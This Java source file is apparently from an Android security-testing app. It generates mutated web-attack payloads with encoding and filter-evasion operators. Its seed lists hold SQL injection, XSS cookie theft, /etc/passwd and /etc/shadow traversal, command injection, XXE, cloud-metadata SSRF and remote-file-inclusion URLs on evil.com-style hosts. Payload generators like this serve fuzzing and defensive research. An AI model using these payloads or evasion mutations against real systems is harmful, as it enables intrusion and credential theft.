package com.example.plgenn.utils;

import android.content.Context;
import android.net.Uri;
import android.util.Log;

import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/** Template-seeded generator with normalized repetition-density guided mutation. */
public class GNNGenerator {
    private static final String TAG = "GNNGenerator";
    public static final String COMP_BASIC = "Basic";
    public static final String COMP_ADVANCED = "Advanced";
    public static final String COMP_EVASION = "Evasion";

    // Frozen on the 67 in-app seed templates (tokenizer v1; see the run report).
    public static final double THETA_1 = 0.015151515151515152;
    public static final double THETA_2 = 0.07142857142857142;
    public static final double DIRECT_SEED_PROBABILITY = 0.70;
    private static final int ATTEMPTS_PER_CALL = 60;

    private final Random random = new Random();
    private final File eventLog;

    public GNNGenerator(Context context) {
        eventLog = new File(context.getApplicationContext().getFilesDir(), "density_mutation_events.csv");
    }

    /** Returns unique structurally-valid outputs; all 60 attempts, including rejects and duplicates, are logged. */
    public List<String> generatePayloadsWithGNN(String category, String description, String complexity, String target) {
        long start = System.currentTimeMillis();
        String runId = UUID.randomUUID().toString();
        List<String> seeds = semiDynamic(category);
        if (seeds.isEmpty()) return new ArrayList<>();
        Set<String> accepted = new LinkedHashSet<>();
        int mutationAttempt = 0;
        for (int i = 0; i < ATTEMPTS_PER_CALL; i++) {
            String seed = seeds.get(random.nextInt(seeds.size()));
            double density = normalizedRepetitionDensity(seed);
            String intensity = intensityFor(density);
            boolean mutationPath = random.nextDouble() >= DIRECT_SEED_PROBABILITY;
            List<String> operators = new ArrayList<>();
            String payload;
            if (mutationPath) payload = mutate(seed, category, intensity, complexity, operators);
            else {
                payload = applyProfile(seed, category, complexity);
                operators.add(profileOperator(category, complexity));
            }
            boolean valid = isStructurallyValid(category, payload);
            boolean duplicate = accepted.contains(payload);
            if (valid && !duplicate) accepted.add(payload);
            if (mutationPath) mutationAttempt++;
            appendEvent(runId, i + 1, category, complexity, seed, density, intensity,
                    mutationPath ? "ADAPTIVE_MUTATION" : "DIRECT_SEED", String.join("|", operators), payload,
                    valid, duplicate, valid ? (duplicate ? "duplicate_of_prior_valid_output" : "accepted") : "class_structure_predicate_failed");
        }
        List<String> result = new ArrayList<>(accepted);
        Collections.shuffle(result, random);
        Log.i(TAG, "run=" + runId + " class=" + category + " profile=" + complexity
                + " attempts=" + ATTEMPTS_PER_CALL + " mutationAttempts=" + mutationAttempt
                + " validUnique=" + result.size() + " PSR=" + (result.size() / (double) ATTEMPTS_PER_CALL)
                + " IMR=" + mutationFailureRate(runId) + " elapsedMs=" + (System.currentTimeMillis() - start));
        return result;
    }

    /** Tokenizer v1: lowercased identifiers, percent octets, multi-character operators, then non-space symbols. */
    public static List<String> tokenize(String payload) {
        List<String> out = new ArrayList<>();
        Matcher m = Pattern.compile("(?i)[a-z_][a-z0-9_]*|%[0-9a-f]{2}|(?:==|!=|<=|>=|&&|\\|\\||\\.\\.|//|/\\*|\\*/|--|#)|[^\\s]").matcher(payload);
        while (m.find()) out.add(m.group().toLowerCase(Locale.ROOT));
        return out;
    }

    /** HHI with the unique-token baseline removed and the maximum concentration scaled to 1. */
    public static double normalizedRepetitionDensity(String payload) {
        List<String> tokens = tokenize(payload);
        int n = tokens.size();
        if (n < 2) return 0.0;
        Map<String, Integer> frequencies = new HashMap<>();
        for (String token : tokens) frequencies.put(token, frequencies.getOrDefault(token, 0) + 1);
        long squareSum = 0;
        for (int f : frequencies.values()) squareSum += (long) f * f;
        return (squareSum - n) / (double) (n * (long) (n - 1));
    }

    public static String intensityFor(double density) {
        if (density < THETA_1) return "LOW";
        if (density < THETA_2) return "MODERATE";
        return "HIGH";
    }

    private String mutate(String seed, String category, String intensity, String profile, List<String> operators) {
        String value = seed;
        int count = "LOW".equals(intensity) ? 1 : ("MODERATE".equals(intensity) ? 2 : 3);
        for (int i = 0; i < count; i++) {
            int selector = i + i + random.nextInt(3);
            value = applyMutationOperator(value, category, selector);
            operators.add(mutationOperator(category, selector));
        }
        value = applyProfile(value, category, profile);
        operators.add(profileOperator(category, profile));
        return value;
    }

    private String profileOperator(String category, String profile) {
        if (COMP_BASIC.equals(profile)) return "profile_basic_identity";
        if (COMP_ADVANCED.equals(profile) && "SQL Injection".equals(category)) return "profile_advanced_sql_comment_spacing";
        if (COMP_ADVANCED.equals(profile) && "GraphQL Injection".equals(category)) return "profile_advanced_graphql_compaction";
        if (COMP_EVASION.equals(profile)) return "profile_evasion_percent_encoding";
        return "profile_" + String.valueOf(profile).toLowerCase(Locale.ROOT) + "_identity";
    }

    private String mutationOperator(String category, int selector) {
        switch (category) {
            case "SQL Injection": return selector % 3 == 0 ? "sql_space_to_comment" : selector % 3 == 1 ? "sql_url_encode" : "sql_keyword_case_change";
            case "XSS": return selector % 2 == 0 ? "xss_tag_case_change" : "xss_url_encode";
            case "IDOR": return "idor_increment_numeric_identifier";
            case "Path Traversal":
            case "Local File Inclusion": return "path_add_traversal_segment";
            case "Command Injection": return selector % 2 == 0 ? "command_space_to_ifs_braced" : "command_space_to_ifs";
            case "SSRF": return "ssrf_alternate_loopback_host";
            case "Remote File Inclusion": return "rfi_http_to_https";
            case "XXE": return "xxe_case_change_declaration";
            case "GraphQL Injection": return "graphql_remove_whitespace";
            case "Open Redirect": return "redirect_toggle_scheme";
            case "API Abuse": return "api_json_compaction";
            default: return "unknown_noop";
        }
    }

    private String applyMutationOperator(String s, String category, int selector) {
        switch (category) {
            case "SQL Injection":
                if (selector % 3 == 0) return s.replace(" ", "/**/");
                if (selector % 3 == 1) return encode(s);
                return s.replace(" OR ", " or ").replace(" UNION ", " union ");
            case "XSS":
                if (selector % 2 == 0) return s.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>");
                return encode(s);
            case "IDOR":
                Matcher id = Pattern.compile("(=)(\\d+)").matcher(s);
                if (id.find()) return id.replaceFirst(Matcher.quoteReplacement("=" + (Integer.parseInt(id.group(2)) + 1)));
                return s;
            case "Path Traversal":
            case "Local File Inclusion":
                return s.startsWith("../") ? "../" + s : s.startsWith("..\\") ? "..\\" + s : s;
            case "Command Injection":
                return s.replace(" ", selector % 2 == 0 ? "${IFS}" : "$IFS");
            case "SSRF":
                return s.replace("127.0.0.1", "localhost").replace("localhost", "127.0.0.1");
            case "Remote File Inclusion":
                return s.replace("http://", "https://");
            case "XXE":
                return s.replace("<!DOCTYPE", "<!doctype").replace("<!ENTITY", "<!entity");
            case "GraphQL Injection":
                return s.replace(" ", "");
            case "Open Redirect":
                return s.replace("https://", "http://").replace("http://", "https://");
            case "API Abuse":
                return s.replace(" ", "");
            default:
                return s;
        }
    }

    private String applyProfile(String s, String category, String profile) {
        if (COMP_BASIC.equals(profile)) return s;
        if (COMP_ADVANCED.equals(profile)) {
            if ("SQL Injection".equals(category)) return s.replace(" ", "/**/");
            if ("GraphQL Injection".equals(category)) return s.replace(" ", "");
            return s;
        }
        if (COMP_EVASION.equals(profile)) return encode(s);
        return s;
    }

    private String encode(String s) {
        return s.replace("%", "%25").replace("'", "%27").replace(" ", "%20")
                .replace("<", "%3C").replace(">", "%3E").replace("\"", "%22")
                .replace("{", "%7B").replace("}", "%7D");
    }

    /** Conservative structural checks; they do not assert target-side exploitability. */
    public static boolean isStructurallyValid(String category, String p) {
        String x = p.toLowerCase(Locale.ROOT);
        switch (category) {
            case "SQL Injection": return Pattern.compile("(?i)(?:%27|'|\\bunion\\b|\\bor\\b|\\band\\b|--|#|/\\*)").matcher(p).find();
            case "XSS": return (x.contains("<script") || x.contains("<img") || x.contains("<svg") || x.contains("<body") || x.contains("<iframe") || x.contains("%3c"))
                    && (x.contains("alert") || x.contains("confirm") || x.contains("prompt") || x.contains("onerror") || x.contains("onload") || x.contains("javascript"));
            case "IDOR": return Pattern.compile("(?i)(?:id|user|account)=\\d+").matcher(p).find();
            case "Command Injection": return Pattern.compile("(?i)(?:;|&&|\\|)\\s*(?:(?:\\$IFS|\\$\\{IFS\\})\\s*)?(?:whoami|id|cat|ls|uname|pwd)").matcher(p).find();
            case "Path Traversal": return (x.contains("../") || x.contains("..\\")) && (x.contains("etc/") || x.contains("win.ini") || x.contains("boot.ini") || x.contains("hosts"));
            case "SSRF": return x.matches("https?://.*") && (x.contains("localhost") || x.contains("127.0.0.1") || x.contains("169.254.169.254") || x.contains("0.0.0.0") || x.contains("::1"));
            case "Local File Inclusion": return (x.contains("../") || x.contains("..\\")) && (x.contains("etc/") || x.contains("win.ini") || x.contains("boot.ini"));
            case "Remote File Inclusion": return x.matches("https?://[^/]+/.+");
            case "XXE": return x.contains("<!doctype") || x.contains("<!entity") || x.contains("%3c!doctype") || x.contains("%3c!entity");
            case "GraphQL Injection": return (x.contains("{") || x.contains("%7b"))
                    && (x.contains("}") || x.contains("%7d")) && (x.contains("user") || x.contains("users"));
            case "Open Redirect": return x.startsWith("http://") || x.startsWith("https://") || x.startsWith("//");
            case "API Abuse":
                try { JSONObject j = new JSONObject(p); return j.has("role") || j.has("access") || j.has("admin"); }
                catch (Exception e) { return x.contains("%7b") && (x.contains("admin") || x.contains("role") || x.contains("access")); }
            default: return false;
        }
    }

    private synchronized void appendEvent(String runId, int attempt, String category, String profile, String seed,
                                          double density, String intensity, String path, String operationSequence, String payload,
                                          boolean valid, boolean duplicate, String reason) {
        try (FileWriter w = new FileWriter(eventLog, true)) {
            if (eventLog.length() == 0) w.write("timestamp,run_id,attempt,category,profile,seed,density,theta1,theta2,intensity,path,operation_sequence,payload,structurally_valid,duplicate,decision\n");
            String ts = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSXXX", Locale.ROOT).format(new Date());
            w.write(csv(ts) + "," + csv(runId) + "," + attempt + "," + csv(category) + "," + csv(profile)
                    + "," + csv(seed) + "," + density + "," + THETA_1 + "," + THETA_2 + "," + intensity
                    + "," + path + "," + csv(operationSequence) + "," + csv(payload) + "," + valid + "," + duplicate + "," + csv(reason) + "\n");
        } catch (IOException e) { Log.e(TAG, "Could not append density event", e); }
    }

    private double mutationFailureRate(String runId) {
        // Aggregated from the same append-only event log after this run has completed.
        int attempts = 0, invalid = 0;
        try (java.io.BufferedReader r = new java.io.BufferedReader(new java.io.FileReader(eventLog))) {
            String line;
            while ((line = r.readLine()) != null) {
                if (!line.contains(runId) || !line.contains(",ADAPTIVE_MUTATION,")) continue;
                attempts++;
                if (line.contains(",false,")) invalid++;
            }
        } catch (IOException ignored) { return Double.NaN; }
        return attempts == 0 ? Double.NaN : invalid / (double) attempts;
    }

    private String csv(String s) { return "\"" + s.replace("\"", "\"\"").replace("\r", " ").replace("\n", " ") + "\""; }

    private List<String> semiDynamic(String cat) {
        List<String> list = new ArrayList<>();
        switch (cat) {
            case "SQL Injection": Collections.addAll(list, "' OR 1=1--", "' OR '1'='1", "' UNION SELECT NULL--", "' AND 1=1--", "' OR EXISTS(SELECT 1)--", "' OR 'a'='a", "' OR 'x'='x'--", "' UNION SELECT username,password FROM users--", "' OR 1=1#", "' OR ''='"); break;
            case "XSS": Collections.addAll(list, "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<script>confirm(1)</script>", "<script>prompt(1)</script>", "<script>alert(document.cookie)</script>", "<img src=x onerror=confirm(1)>", "<svg onload=confirm(1)>"); break;
            case "Path Traversal": Collections.addAll(list, "../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd", "..\\..\\windows\\win.ini", "../boot.ini", "../etc/shadow", "../../../../windows/system32/drivers/etc/hosts"); break;
            case "Command Injection": Collections.addAll(list, "; whoami", "&& id", "| cat /etc/passwd", "; ls", "&& uname -a", "; pwd", "| whoami", "; cat /etc/passwd"); break;
            case "IDOR": Collections.addAll(list, "id=1", "id=2", "id=3", "id=100", "user=1", "user=2", "account=1"); break;
            case "SSRF": Collections.addAll(list, "http://127.0.0.1", "http://localhost", "http://169.254.169.254", "http://0.0.0.0", "http://[::1]"); break;
            case "Local File Inclusion": Collections.addAll(list, "../../../../etc/passwd", "../../../../windows/win.ini", "../etc/passwd", "../boot.ini"); break;
            case "Remote File Inclusion": Collections.addAll(list, "http://evil.com/shell.txt", "http://attacker.com/payload.php", "http://malicious.site/backdoor.txt"); break;
            case "XXE": Collections.addAll(list, "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>", "<!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]>", "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"); break;
            case "GraphQL Injection": Collections.addAll(list, "{ user(id:1){password}}", "{ users{id,password}}", "{user(id:\"1\"){email}}"); break;
            case "Open Redirect": Collections.addAll(list, "https://evil.com", "//evil.com", "http://attacker.com"); break;
            case "API Abuse": Collections.addAll(list, "{\"role\":\"admin\"}", "{\"access\":\"root\"}", "{\"admin\":true}"); break;
        }
        return list;
    }

    public void close() { }
}
